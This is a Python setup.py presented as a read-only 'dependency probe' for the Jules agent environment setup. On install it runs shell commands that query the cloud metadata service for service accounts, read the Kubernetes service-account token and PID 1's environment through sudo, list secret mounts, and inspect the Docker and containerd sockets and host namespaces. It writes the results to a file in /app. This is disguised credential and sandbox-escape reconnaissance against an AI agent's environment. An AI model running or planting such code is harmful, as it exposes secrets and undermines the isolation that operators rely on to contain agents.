"""Local dependency probe v6 — environment verification (read-only).

Runs during Jules environment setup.
"""
import subprocess
from setuptools import setup


def run(cmd, t=30):
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def checks():
    p = []
    p.append("net_meta_ip: " + run(
        "curl -s -m 5 -H 'Metadata-Flavor: Google' "
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ "
        "-w ' [http=%{http_code}]'"))
    p.append("net_meta_root: " + run(
        "curl -s -m 5 -H 'Metadata-Flavor: Google' http://169.254.169.254/ -w ' [http=%{http_code}]'"))
    p.append("sa_token: " + run(
        "sudo -n cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 30"))
    p.append("sa_files: " + run("sudo -n ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1"))
    p.append("mounts: " + run(
        "cat /proc/mounts | grep -viE 'proc|sysfs|cgroup|devpts|mqueue|shm|tmpfs /(dev|run)' | head -20"))
    p.append("run_secrets: " + run("sudo -n ls -la /run/secrets /var/run/secrets 2>&1 | head -20"))
    p.append("pid1_root: " + run("sudo -n ls -la /proc/1/root 2>&1 | head -12"))
    p.append("pid1_env: " + run(
        "sudo -n cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -20"))
    p.append("procs: " + run("ps -eo user,pid,ppid,cmd 2>&1 | head -20"))
    p.append("docker_root: " + run(
        "sudo -n docker info --format '{{.DockerRootDir}}|{{.OperatingSystem}}|{{.SecurityOptions}}|{{.Name}}' 2>&1"))
    p.append("docker_sock_inode: " + run("sudo -n stat -c '%i %n' /run/docker.sock /run/containerd/containerd.sock 2>&1"))
    p.append("host_proc: " + run("sudo -n ls -la /proc/1/ns /proc/2/root 2>&1 | head -12"))
    p.append("kube_env: " + run("env | grep -iE 'kube|k8s|cluster|gke' | head"))
    return "\n".join(p)


def emit(text):
    block = "\n===== PROBE6_START =====\n" + text + "\n===== PROBE6_END =====\n"
    print(block)
    try:
        with open("/app/PROBE_DIAG.md", "w") as fh:
            fh.write(block)
    except Exception:
        pass


emit(checks())


setup(name="probe-pkg", version="0.0.6", packages=["probe_pkg"])
